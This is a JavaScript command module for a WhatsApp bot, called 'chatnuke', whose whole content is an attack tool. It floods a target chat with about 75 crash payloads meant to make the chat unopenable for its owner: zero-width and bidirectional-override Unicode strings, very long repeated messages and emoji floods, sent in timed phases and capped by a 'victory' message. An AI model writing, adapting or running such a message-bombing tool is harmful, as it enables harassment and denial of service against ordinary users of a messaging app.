module.exports = {
    cmd: 'chatnuke',
    desc: '💀 PERMANENTLY CRASHES target chat until deleted/cleared (MAX DESTRUCTION)',
    run: async ({ sock, m, args, reply }) => {
        const remoteJid = m.chat || m.key.remoteJid;
        
        // 1. ARMING CONFIRMATION
        await reply(`☠️ *CHAT NUKE ARMED* ☠️\n\n` +
                   `🎯 Target: ${remoteJid.split('@')[0]}\n` +
                   `💣 75+ CRASH PAYLOADS DEPLOYING\n` +
                   `⚠️  TARGET CHAT WILL BECOME UNOPENABLE\n` +
                   `🔥 Recovery: Delete/Clear chat only\n\n` +
                   `*LAUNCHING IN 3 SECONDS...*`);

        await new Promise(r => setTimeout(r, 3000));

        const sleep = ms => new Promise(r => setTimeout(r, ms));

        try {
            // PHASE 1: INVISIBLE UNICODE BOMBS (10x)
            const invisibleBombs = [
                '\u200B'.repeat(5000) + '\uFEFF',
                '\u200C'.repeat(4000) + '\u200D',
                '\u2060'.repeat(6000),
                '\u200E'.repeat(3500) + '\u202A',
                '\u2028'.repeat(4500),
                '\u202F'.repeat(5000),
                '\u2063'.repeat(4000),
                '\u200F'.repeat(5500),
                '\u061C'.repeat(3000),
                '\uFEFF'.repeat(7000) + '\u200B'
            ];

            for (let bomb of invisibleBombs) {
                await sock.sendMessage(remoteJid, { text: bomb });
                await sleep(200);
            }

            // PHASE 2: RTL OVERRIDE HELL (15x)
            const rtlBombs = [
                '\u202E' + '‎'.repeat(10000) + '\u202C',
                '\u202A' + '‎'.repeat(8000) + '\u202C',
                '\u202D' + '‎'.repeat(12000),
                '\u202E\u202A' + 'X'.repeat(5000),
                '\u202B' + '\u200F'.repeat(6000) + '\u202C',
                '\u202E' + '\u200F'.repeat(7000),
                '\u202A\u202E' + '‎'.repeat(9000),
                '\u202D\u202B' + '\u200E'.repeat(4000),
                '\u202E'.repeat(50) + 'CRASH',
                '\u202A'.repeat(30) + '\u202D'.repeat(20),
                '\u202B\u202E\u202A' + '‎'.repeat(10000),
                '\u200F'.repeat(2000) + '\u202E' + '\u200E'.repeat(3000),
                '\u202C\u202D\u202B' + 'X'.repeat(6000),
                '\uFEFF\u202E' + '\u200B'.repeat(8000),
                '\u202A'.repeat(100) + '\u202C'
            ];

            for (let rtl of rtlBombs) {
                await sock.sendMessage(remoteJid, { text: rtl });
                await sleep(150);
            }

            // PHASE 3: MASSIVE LONG MESSAGES (10x)
            const longBombs = [];
            const baseText = '💀CHAT_KILLER💀'.repeat(500);
            
            for (let i = 0; i < 10; i++) {
                longBombs.push(baseText.repeat(20 + i * 5));
            }

            for (let longMsg of longBombs) {
                await sock.sendMessage(remoteJid, { text: longMsg });
                await sleep(300);
            }

            // PHASE 4: EMOJI OVERLOAD (15x)
            const emojiFlood = [
                '😂'.repeat(5000),
                '🔥💀☠️💣'.repeat(3000),
                '🆘🚫❌🚨'.repeat(4000),
                Array(10000).fill('😈').join(''),
                '⚡💥🔥💀'.repeat(2500),
                '📱💥💀🔥⚡'.repeat(2000),
                Array(8000).fill('🧨').join(''),
                '💀'.repeat(10000),
                '🔥'.repeat(7000) + '💀'.repeat(3000),
                Array(12000).fill('⚡').join(''),
                '😈🤡💀🔥💣'.repeat(1500),
                Array(6000).fill('🚨').join(''),
                '💀💀💀💀💀'.repeat(2000),
                Array(9000).fill('🆘').join(''),
                '☠️'.repeat(15000)
            ];

            for (let emoji of emojiFlood) {
                await sock.sendMessage(remoteJid, { text: emoji });
                await sleep(250);
            }

            // PHASE 5: MIXED CHAOS (15x)
            const chaosPayloads = [
                '\u202E' + '💀'.repeat(4000) + '\u202C',
                Array(5000).fill('\u200B').join('') + 'CRASH',
                '\uFEFF' + '🔥'.repeat(6000),
                '‎'.repeat(10000) + '\u202A💀\u202C',
                Array(3000).fill('\u200C😈').join(''),
                '\u202D' + Array(7000).fill('⚡').join(''),
                '💀' + '\u200F'.repeat(5000) + '🔥',
                Array(4000).fill('\u2060💣').join(''),
                '\u202E🔥💀⚡💥' + '\u202C'.repeat(100),
                'CRASH' + Array(8000).fill('\u200B').join(''),
                Array(2000).fill('🆘🚨').join('') + '\u202A',
                '\uFEFF💀' + '‎'.repeat(9000),
                Array(6000).fill('\u200D🔥').join(''),
                '☠️' + '\u202B' + Array(5000).fill('💀').join(''),
                Array(10000).fill('\u2063').join('') + 'END'
            ];

            for (let chaos of chaosPayloads) {
                await sock.sendMessage(remoteJid, { text: chaos });
                await sleep(200);
            }

            // FINAL BOSS: ULTIMATE CRASHER
            await sleep(1000);
            await sock.sendMessage(remoteJid, { 
                text: '\uFEFF\u202E\u202A\u202D\u202B' + 
                      Array(15000).fill('\u200B💀🔥⚡').join('') + 
                      '\u202C☠️CHAT_KILLED☠️' 
            });

            // VICTORY MESSAGE
            await sleep(2000);
            await reply(`✅ *CHAT NUKE COMPLETE* ✅\n\n` +
                       `🎯 Target chat PERMANENTLY DISABLED\n` +
                       `💀 They cannot open your chat anymore\n` +
                       `🔥 Only fix: DELETE or CLEAR chat\n` +
                       `⚡ 75 payloads deployed successfully\n\n` +
                       `*NUKE SUCCESSFUL* ☠️`);

        } catch (e) {
            console.error('NUKE ERROR:', e);
            reply('⚠️ Some payloads failed - still effective');
        }
    }
};
